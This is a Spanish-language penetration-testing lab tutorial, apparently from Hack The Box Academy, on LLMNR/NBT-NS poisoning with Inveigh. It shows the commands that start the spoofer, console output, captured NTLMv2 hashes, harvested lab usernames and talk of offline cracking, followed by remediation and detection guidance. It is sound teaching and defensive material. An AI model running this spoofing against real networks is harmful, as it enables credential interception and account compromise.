LLMNR & NBT-NS poisoning es posible desde un host Windows también. En la última sección, utilizamos Responder para capturar hashes. Esta sección explorará la herramienta [Inveigh](https://github.com/Kevin-Robertson/Inveigh) y tratará de capturar otro conjunto de credenciales.

---

## Inveigh - Overview

Si terminamos con un host Windows como nuestra caja de ataque, nuestro cliente nos proporciona una caja Windows para probar, o aterrizamos en un host Windows como administrador local a través de otro método de ataque y queremos ampliar nuestro acceso, la herramienta [Inveigh](https://github.com/Kevin-Robertson/Inveigh) funciona de manera similar a Responder, pero está escrita en PowerShell y C#. Inveigh puede escuchar en IPv4 e IPv6 y varios otros protocolos, incluyendo `LLMNR`, DNS, `mDNS`, NBNS, `DHCPv6`, ICMPv6, `HTTP`, HTTPS, `SMB`, LDAP, `WebDAV`, y Proxy Auth. La herramienta está disponible en el directorio `C:\Tools` en el host de ataque Windows proporcionado.

Podemos comenzar con la versión PowerShell de la siguiente manera y luego listar todos los parámetros posibles. Hay un [wiki](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) que lista todos los parámetros e instrucciones de uso.

## Using Inveigh

```r
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters

Key                     Value
---                     -----
ADIDNSHostsIgnore       System.Management.Automation.ParameterMetadata
KerberosHostHeader      System.Management.Automation.ParameterMetadata
ProxyIgnore             System.Management.Automation.ParameterMetadata
PcapTCP                 System.Management.Automation.ParameterMetadata
PcapUDP                 System.Management.Automation.ParameterMetadata
SpooferHostsReply       System.Management.Automation.ParameterMetadata
SpooferHostsIgnore      System.Management.Automation.ParameterMetadata
SpooferIPsReply         System.Management.Automation.ParameterMetadata
SpooferIPsIgnore        System.Management.Automation.ParameterMetadata
WPADDirectHosts         System.Management.Automation.ParameterMetadata
WPADAuthIgnore          System.Management.Automation.ParameterMetadata
ConsoleQueueLimit       System.Management.Automation.ParameterMetadata
ConsoleStatus           System.Management.Automation.ParameterMetadata
ADIDNSThreshold         System.Management.Automation.ParameterMetadata
ADIDNSTTL               System.Management.Automation.ParameterMetadata
DNSTTL                  System.Management.Automation.ParameterMetadata
HTTPPort                System.Management.Automation.ParameterMetadata
HTTPSPort               System.Management.Automation.ParameterMetadata
KerberosCount           System.Management.Automation.ParameterMetadata
LLMNRTTL                System.Management.Automation.ParameterMetadata

<SNIP>
```

Vamos a iniciar Inveigh con spoofing de LLMNR y NBNS, y salida a la consola y escritura en un archivo. Dejaremos el resto de los valores predeterminados, que se pueden ver [aquí](https://github.com/Kevin-Robertson/Inveigh#parameter-help).

```r
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

[*] Inveigh 1.506 started at 2022-02-28T19:26:30
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.5.25
[+] Spoofer IP Address = 172.16.5.25
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer For Types 00,20 = Enabled
[+] NBNS TTL = 165 Seconds
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Certificate Issuer = Inveigh
[+] HTTPS Certificate CN = localhost
[+] HTTPS Capture = Enabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Full
[+] File Output = Enabled
[+] Output Directory = C:\Tools
WARNING: [!] Run Stop-Inveigh to stop
[*] Press any key to stop console output
WARNING: [-] [2022-02-28T19:26:31] Error starting HTTP listener
WARNING: [!] [2022-02-28T19:26:31] Exception calling "Start" with "0" argument(s): "An attempt was made to access a
socket in a way forbidden by its access permissions" $HTTP_listener.Start()
[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:31] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:33] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:34] TCP(445) SYN packet detected from 172.16.5.125:56834
[+] [2022-02-28T19:26:34] SMB(445) negotiation request detected from 172.16.5.125:56834
[+] [2022-02-28T19:26:34] SMB(445) NTLM challenge 7E3B0E53ADB4AE51 sent to 172.16.5.125:56834

<SNIP>
```

Podemos ver que inmediatamente comenzamos a recibir solicitudes de LLMNR y mDNS. La siguiente animación muestra la herramienta en acción.

![image](https://academy.hackthebox.com/storage/modules/143/inveigh_pwsh.png)

---

## C# Inveigh (InveighZero)

La versión PowerShell de Inveigh es la versión original y ya no se actualiza. El autor de la herramienta mantiene la versión C#, que combina el código PoC C# original y un port en C# de la mayor parte del código de la versión PowerShell. Antes de poder usar la versión C# de la herramienta, tenemos que compilar el ejecutable. Para ahorrar tiempo, hemos incluido una copia de las versiones de PowerShell y del ejecutable compilado de la herramienta en la carpeta `C:\Tools` en el host de destino en el laboratorio, pero vale la pena realizar el ejercicio (y la mejor práctica) de compilarlo tú mismo usando Visual Studio.

Vamos a ejecutar la versión C# con los valores predeterminados y comenzar a capturar hashes.

```r
PS C:\htb> .\Inveigh.exe

[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]
[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[ ] DHCPv6
[+] DNS Packet Sniffer [Type A]
[ ] ICMPv6
[+] LLMNR Packet Sniffer [Type A]
[ ] MDNS
[ ] NBNS
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[ ] HTTPS
[+] WebDAV [WebDAVAuth NTLM]
[ ] Proxy
[+] LDAP Listener [Port 389]
[+] SMB Packet Sniffer [Port 445]
[+] File Output [C:\Tools]
[+] Previous Session Files (Not Found)
[*] Press ESC to enter/exit interactive console
[!] Failed to start HTTP listener on port 80, check IP and port usage.
[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.
[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
[ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[+] [20:03:32] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
[-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[+] [20:03:32] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
[-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
```

Como podemos ver, la herramienta se inicia y muestra qué opciones están habilitadas por defecto y cuáles no. Las opciones con un `[+]` están habilitadas por defecto y las que tienen un `[ ]` delante están deshabilitadas. La salida de la consola en ejecución también nos muestra qué opciones están deshabilitadas y, por lo tanto, no se están enviando respuestas (mDNS en el ejemplo anterior). También podemos ver el mensaje `Press ESC to enter/exit interactive console`, que es muy útil mientras se ejecuta la herramienta. La consola nos da acceso a las credenciales/hashes capturados, nos permite detener Inveigh y más.

Podemos presionar la tecla `esc` para entrar en la consola mientras Inveigh está en ejecución.

```r

<SNIP>

[+] [20:10:24] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
[+] [20:10:24] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61310
[.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61311
C(0:0) NTLMv1(0:0) NTLMv2(3:9)> HELP
```

Después de escribir `HELP` y presionar enter, se nos presentan varias opciones:

```r

=============================================== Inveigh Console Commands ===============================================

Command                           Description
========================================================================================================================
GET CONSOLE                     | get queued console output
GET DHCPv6Leases                | get DHCPv6 assigned IPv6 addresses
GET LOG                         | get log entries; add search string to filter results
GET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter results
GET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter results
GET NTLMV1UNIQUE                | get one captured NTLMv1 hash per user; add search string to filter results
GET NTLMV2UNIQUE                | get one captured NTLMv2 hash per user; add search string to filter results
GET NTLMV1USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv1 hashes
GET NTLMV2USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv2 hashes
GET CLEARTEXT                   | get captured cleartext credentials
GET CLEARTEXTUNIQUE             | get unique captured cleartext credentials
GET REPLYTODOMAINS              | get ReplyToDomains parameter startup values
GET REPLYTOHOSTS                | get ReplyToHosts parameter startup values
GET REPLYTOIPS                  | get ReplyToIPs parameter startup values
GET REPLYTOMACS                 | get ReplyToMACs parameter startup values
GET IGNOREDOMAINS               | get IgnoreDomains parameter startup values
GET IGNOREHOSTS                 | get IgnoreHosts parameter startup values
GET IGNOREIPS                   | get IgnoreIPs parameter startup values
GET IGNOREMACS                  | get IgnoreMACs parameter startup values
SET CONSOLE                     | set Console parameter value
HISTORY                         | get command history
RESUME                          | resume real time console output
STOP                            | stop Inveigh
```

Podemos ver rápidamente los hashes únicos capturados escribiendo `GET NTLMV2UNIQUE`.

```r

================================================= Unique NTLMv2 Hashes =================================================

Hashes
========================================================================================================================
backupagent::INLANEFREIGHT:B5013246091943D7:16A41B703C8D4F8F6AF75C47C3B50CB5:01010000000000001DBF1816222DD801DF80FE7D54E898EF0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00070008001DBF1816222DD8010600040002000000080030003000000000000000000000000030000004A1520CE1551E8776ADA0B3AC0176A96E0E200F3E0D608F0103EC5C3D5F22E80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000
forend::INLANEFREIGHT:32FD89BD78804B04:DFEB0C724F3ECE90E42BAF061B78BFE2:010100000000000016010623222DD801B9083B0DCEE1D9520000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080016010623222DD8010600040002000000080030003000000000000000000000000030000004A1520CE1551E8776ADA0B3AC0176A96E0E200F3E0D608F0103EC5C3D5F22E80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0035002E00320035000000000000000000

<SNIP>
```

Podemos escribir `GET NTLMV2USERNAMES` y ver qué nombres de usuario hemos recopilado. Esto es útil si queremos una lista de usuarios para realizar una enumeración adicional y ver cuáles vale la pena intentar crackear offline utilizando Hashcat.

```r

=================================================== NTLMv2 Usernames ===================================================

IP Address                        Host                              Username                          Challenge
========================================================================================================================
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\backupagent       | B5013246091943D7
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\forend            | 32FD89BD78804B04
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\clusteragent      | 28BF08D82FA998E4
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\wley              | 277AC2ED022DB4F7
172.16.5.125                    | ACADEMY-EA-FILE                 | INLANEFREIGHT\svc_qualys        | 5F9BB670D23F23ED
```

Vamos a iniciar Inveigh y luego interactuar con la salida un poco para ponerlo todo junto.

![image](https://academy.hackthebox.com/storage/modules/143/inveigh_csharp.png)

---

## Remediation

Mitre ATT&CK lista esta técnica como [ID: T1557.001](https://attack.mitre.org/techniques/T1557/001), `Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay`.

Hay algunas formas de mitigar este ataque. Para asegurar que estos ataques de spoofing no sean posibles, podemos deshabilitar LLMNR y NBT-NS. Como palabra de precaución, siempre vale la pena probar lentamente un cambio significativo como este en tu entorno antes de implementarlo por completo. Como pentesters, podemos recomendar estos pasos de remediación, pero debemos comunicar claramente a nuestros clientes que deben probar estos cambios exhaustivamente para asegurarse de que deshabilitar ambos protocolos no rompa nada en la red.

Podemos deshabilitar LLMNR en la Política de Grupo yendo a Configuración del equipo --> Plantillas administrativas --> Red --> Cliente DNS y habilitando "Desactivar resolución de nombres multicast."

![image](https://academy.hackthebox.com/storage/modules/143/llmnr_disable.png)

NBT-NS no se puede deshabilitar a través de la Política de Grupo, sino que debe deshabilitarse localmente en cada host. Podemos hacer esto abriendo `Network and Sharing Center` en `Control Panel`, haciendo clic en `Change adapter settings`, haciendo clic derecho en el adaptador para ver sus propiedades, seleccionando `Internet Protocol Version 4 (TCP/IPv4)` y haciendo clic en el botón `Properties`, luego haciendo clic en `Advanced` y seleccionando la pestaña `WINS` y finalmente seleccionando `Disable NetBIOS over TCP/IP`.

![image](https://academy.hackthebox.com/storage/modules/143/disable_nbtns.png)

Si bien no es posible deshabilitar NBT-NS directamente a través de GPO, podemos crear un script de PowerShell en Configuración del equipo --> Configuración de Windows --> Scripts (Inicio/Apagado) --> Inicio con algo como lo siguiente:

```r

$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```

En el Editor de directivas de grupo local, necesitaremos hacer doble clic en `Startup`, elegir la pestaña `PowerShell Scripts` y seleccionar "Para esta GPO, ejecutar scripts en el siguiente orden" para `Run Windows PowerShell scripts first`, y luego hacer clic en `Add` y elegir el script. Para que estos cambios se produzcan, tendríamos que reiniciar el sistema de destino o reiniciar el adaptador de red.

![image](https://academy.hackthebox.com/storage/modules/143/nbtns_gpo.png)

Para implementar esto en todos los hosts en un dominio, podríamos crear una GPO utilizando `Group Policy Management` en el Domain Controller y alojar el script en el recurso compartido SYSVOL en la carpeta de scripts y luego llamarlo a través de su ruta UNC, como:

`\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts`

Una vez que la GPO se aplique a unidades organizativas específicas y esos hosts se reinicien, el script se ejecutará en el próximo reinicio y deshabilitará NBT-NS, siempre que el script aún exista en el recurso compartido SYSVOL y sea accesible por el host a través de la red.

![image](https://academy.hackthebox.com/storage/modules/143/nbtns_gpo_dc.png)

Otras mitigaciones incluyen filtrar el tráfico de red para bloquear el tráfico LLMNR/NetBIOS y habilitar la firma SMB para prevenir ataques de relay NTLM. Los sistemas de detección y prevención de intrusiones en la red también pueden usarse para mitigar esta actividad, mientras que la segmentación de la red puede usarse para aislar hosts que requieren LLMNR o NetBIOS habilitados para funcionar correctamente.

---

## Detection

No siempre es posible deshabilitar LLMNR y NetBIOS, y por lo tanto necesitamos formas de detectar este tipo de comportamiento de ataque. Una forma es usar el ataque contra los atacantes inyectando solicitudes de LLMNR y NBT-NS para hosts inexistentes a través de diferentes subredes y alertar si alguna de las respuestas recibe respuestas, lo que sería indicativo de un atacante falsificando respuestas de resolución de nombres. Este [blog post](https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/) explica este método más a fondo.

Además, se pueden monitorear los hosts en busca de tráfico en los puertos UDP 5355 y 137, y los IDs de eventos [4697](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4697) y [7045](https://www.manageengine.com/products/active-directory-audit/kb/system-events/event-id-7045.html) se pueden monitorear. Finalmente, podemos monitorear la clave del registro `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient` para cambios en el valor DWORD `EnableMulticast`. Un valor de `0` significaría que LLMNR está deshabilitado.

---

## Moving On

Ahora hemos capturado hashes para varias cuentas. En este punto de nuestra evaluación, querr

íamos realizar una enumeración utilizando una herramienta como BloodHound para determinar si alguno o todos estos hashes valen la pena crackear. Si tenemos suerte y crackeamos un hash para una cuenta de usuario con algún acceso o derechos privilegiados, podemos comenzar a expandir nuestro alcance en el dominio. ¡Incluso podríamos tener mucha suerte y crackear el hash de un usuario de Domain Admin! Si no tuvimos suerte al crackear hashes o crackeamos algunos pero no produjeron resultados, entonces tal vez el password spraying (que cubriremos en profundidad en las siguientes secciones) será más exitoso.

Por favor, espere de 3 a 5 minutos para que la máquina esté disponible después de iniciar el objetivo de la pregunta a continuación.